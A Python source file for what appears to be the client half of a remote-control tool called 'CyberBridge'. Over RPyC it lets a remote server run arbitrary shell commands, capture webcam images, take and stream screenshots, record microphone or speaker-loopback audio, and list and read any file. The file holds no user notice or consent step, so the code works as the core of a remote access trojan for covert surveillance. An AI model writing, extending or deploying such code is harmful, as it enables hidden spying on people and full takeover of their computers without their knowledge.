"""
CyberBridge - Client RPC Module
Connects to the CyberBridge server via RPyC and exposes all local capabilities
(terminal, camera, microphone, screenshots) as remote-callable methods.
"""

import sys
import os
import subprocess
import threading
import time
import io
import platform

import rpyc
from rpyc.utils.server import ThreadedServer

# ── Optional imports (camera / audio / screenshot) ───────────────────────────
try:
    import cv2
    _CV2_AVAILABLE = True
except ImportError:
    _CV2_AVAILABLE = False

try:
    import pyaudio
    _AUDIO_AVAILABLE = True
except ImportError:
    _AUDIO_AVAILABLE = False

try:
    from PIL import ImageGrab
    import PIL.Image
    _SCREENSHOT_AVAILABLE = True
except ImportError:
    _SCREENSHOT_AVAILABLE = False

# Add parent to path for shared imports (works for .py and frozen .exe)
if getattr(sys, 'frozen', False):
    _cyberbridge_root = sys._MEIPASS
else:
    _cyberbridge_root = os.path.abspath(
        os.path.join(os.path.dirname(__file__), '..', '..')
    )
if _cyberbridge_root not in sys.path:
    sys.path.insert(0, _cyberbridge_root)
from shared.protocol import CyberBridgeService

# ── Module-level audio state ──────────────────────────────────────────────────
# Using a module-level dict so ALL ClientService instances (created per-connection
# by RPyC's ThreadedServer) share ONE buffer — no class-identity issues.
_AUDIO = {
    "active": False,
    "buffer": b"",
    "error":  None,
    "device": None,
    "lock":   threading.Lock(),
}


# ─── Client RPC Service Implementation ───────────────────────────────────────

class ClientService(CyberBridgeService):
    """
    Full implementation of the CyberBridge RPC service running on the client.
    The server connects to this and calls these methods remotely.
    """

    # ── Internal state ────────────────────────────────────────────────────────
    _audio_active   = False
    _audio_buffer   = b""
    _audio_lock     = threading.Lock()
    _audio_stream   = None
    _pa_instance    = None

    # ── Heartbeat ─────────────────────────────────────────────────────────────

    def exposed_ping(self) -> str:
        return "pong"

    # ── System Info ───────────────────────────────────────────────────────────

    def exposed_get_system_info(self) -> dict:
        import socket
        import psutil
        info = {
            "hostname":   socket.gethostname(),
            "platform":   platform.system(),
            "release":    platform.release(),
            "machine":    platform.machine(),
            "processor":  platform.processor(),
            "python":     platform.python_version(),
            "ip":         socket.gethostbyname(socket.gethostname()),
            "cpu_count":  psutil.cpu_count(),
            "cpu_pct":    psutil.cpu_percent(interval=0.5),
            "ram_total":  psutil.virtual_memory().total,
            "ram_used":   psutil.virtual_memory().used,
            "ram_pct":    psutil.virtual_memory().percent,
            "disk_total": psutil.disk_usage('/').total if platform.system() != 'Windows'
                          else psutil.disk_usage('C:\\').total,
            "disk_used":  psutil.disk_usage('/').used  if platform.system() != 'Windows'
                          else psutil.disk_usage('C:\\').used,
            "uptime":     time.time() - psutil.boot_time(),
        }
        return info

    # ── Terminal ──────────────────────────────────────────────────────────────

    def exposed_execute_command(self, command: str) -> dict:
        try:
            result = subprocess.run(
                command,
                shell=True,
                capture_output=True,
                text=True,
                timeout=30,
                cwd=os.path.expanduser("~"),
            )
            return {
                "stdout":      result.stdout,
                "stderr":      result.stderr,
                "returncode":  result.returncode,
                "command":     command,
            }
        except subprocess.TimeoutExpired:
            return {"stdout": "", "stderr": "Command timed out (30s limit)", "returncode": -1, "command": command}
        except Exception as e:
            return {"stdout": "", "stderr": str(e), "returncode": -1, "command": command}

    # ── Camera ────────────────────────────────────────────────────────────────

    def exposed_get_camera_frame(self) -> bytes:
        if not _CV2_AVAILABLE:
            return b""
        try:
            cap = cv2.VideoCapture(0)
            if not cap.isOpened():
                return b""
            ret, frame = cap.read()
            cap.release()
            if not ret:
                return b""
            _, buf = cv2.imencode('.jpg', frame, [cv2.IMWRITE_JPEG_QUALITY, 70])
            return bytes(buf)
        except Exception:
            return b""

    # ── Screenshot ────────────────────────────────────────────────────────────

    def exposed_screenshot(self) -> bytes:
        """Full-quality screenshot for manual capture."""
        if not _SCREENSHOT_AVAILABLE:
            return b""
        try:
            img = ImageGrab.grab()
            buf = io.BytesIO()
            img.save(buf, format='JPEG', quality=60)
            return buf.getvalue()
        except Exception:
            return b""

    def exposed_screen_frame(self, quality: int = 45, scale: float = 0.6) -> bytes:
        """
        Compressed screen frame for live streaming.
        Lower quality + scale = smaller payload = higher FPS.
        """
        if not _SCREENSHOT_AVAILABLE:
            return b""
        try:
            img = ImageGrab.grab()
            # Scale down for streaming performance
            w = int(img.width  * scale)
            h = int(img.height * scale)
            img = img.resize((w, h))
            buf = io.BytesIO()
            img.save(buf, format='JPEG', quality=quality, optimize=True)
            return buf.getvalue()
        except Exception:
            return b""

    # ── Audio ─────────────────────────────────────────────────────────────────
    # State lives in module-level _AUDIO dict so every ClientService instance
    # (RPyC creates one per connection) shares the same buffer.

    def exposed_start_audio_stream(self) -> bool:
        """Start audio capture. Falls back: mic → WASAPI loopback → any input."""
        if not _AUDIO_AVAILABLE:
            return False
        if _AUDIO["active"]:
            return True

        _AUDIO["active"] = True
        _AUDIO["buffer"] = b""
        _AUDIO["error"]  = None
        _AUDIO["device"] = None

        def _init_and_record():
            pa     = None
            stream = None
            rate   = 16000
            ch     = 1
            try:
                pa = pyaudio.PyAudio()

                # Tier 1: default microphone
                try:
                    stream = pa.open(
                        format=pyaudio.paInt16,
                        channels=1, rate=16000,
                        input=True, frames_per_buffer=512,
                    )
                    _AUDIO["device"] = "microphone (default)"
                except Exception:

                    # Tier 2: WASAPI loopback (speakers)
                    try:
                        wasapi  = pa.get_host_api_info_by_type(pyaudio.paWASAPI)
                        out_idx = wasapi["defaultOutputDevice"]
                        dev     = pa.get_device_info_by_index(out_idx)
                        ch      = min(int(dev["maxOutputChannels"]), 2)
                        rate    = int(dev["defaultSampleRate"])
                        stream  = pa.open(
                            format=pyaudio.paInt16,
                            channels=ch, rate=rate,
                            input=True, input_device_index=out_idx,
                            frames_per_buffer=512,
                        )
                        _AUDIO["device"] = f"speaker loopback: {dev.get('name','')}"
                    except Exception:

                        # Tier 3: any available input device
                        for i in range(pa.get_device_count()):
                            try:
                                dev = pa.get_device_info_by_index(i)
                                if int(dev["maxInputChannels"]) < 1:
                                    continue
                                ch   = 1
                                rate = int(dev["defaultSampleRate"])
                                stream = pa.open(
                                    format=pyaudio.paInt16,
                                    channels=ch, rate=rate,
                                    input=True, input_device_index=i,
                                    frames_per_buffer=512,
                                )
                                _AUDIO["device"] = f"device {i}: {dev.get('name','')}"
                                break
                            except Exception:
                                continue

                if stream is None:
                    _AUDIO["error"]  = "No audio device found (tried mic, loopback, all)"
                    _AUDIO["active"] = False
                    return

                # Recording loop
                while _AUDIO["active"]:
                    try:
                        chunk = stream.read(512, exception_on_overflow=False)
                        # Downmix stereo→mono if needed
                        if ch == 2:
                            import array as _arr
                            s    = _arr.array('h', chunk)
                            mono = _arr.array('h', [
                                (s[i] + s[i+1]) // 2
                                for i in range(0, len(s), 2)
                            ])
                            chunk = mono.tobytes()
                        with _AUDIO["lock"]:
                            _AUDIO["buffer"] += chunk
                            # Cap at ~0.5 s
                            if len(_AUDIO["buffer"]) > 16000:
                                _AUDIO["buffer"] = _AUDIO["buffer"][-16000:]
                    except Exception as re:
                        _AUDIO["error"] = str(re)
                        break

            except Exception as e:
                _AUDIO["error"]  = str(e)
                _AUDIO["active"] = False
            finally:
                for obj, m in [(stream, "stop_stream"), (stream, "close"),
                                (pa, "terminate")]:
                    if obj:
                        try: getattr(obj, m)()
                        except Exception: pass

        threading.Thread(target=_init_and_record, daemon=True).start()
        return True

    def exposed_stop_audio_stream(self) -> bool:
        _AUDIO["active"] = False
        return True

    def exposed_get_audio_chunk(self) -> bytes:
        with _AUDIO["lock"]:
            chunk = _AUDIO["buffer"]
            _AUDIO["buffer"] = b""
        return chunk

    def exposed_audio_status(self) -> dict:
        return {
            "active":    _AUDIO["active"],
            "error":     _AUDIO["error"],
            "device":    _AUDIO["device"],
            "available": _AUDIO_AVAILABLE,
        }


    # ── File System ───────────────────────────────────────────────────────────


    def exposed_list_directory(self, path: str) -> list:
        try:
            entries = []
            for entry in os.scandir(path):
                try:
                    entries.append({
                        "name":     entry.name,
                        "is_dir":   entry.is_dir(),
                        "size":     entry.stat().st_size if not entry.is_dir() else 0,
                        "modified": entry.stat().st_mtime,
                    })
                except PermissionError:
                    continue
            return entries
        except Exception as e:
            return [{"error": str(e)}]

    def exposed_read_file(self, path: str) -> bytes:
        try:
            with open(path, 'rb') as f:
                return f.read()
        except Exception:
            return b""
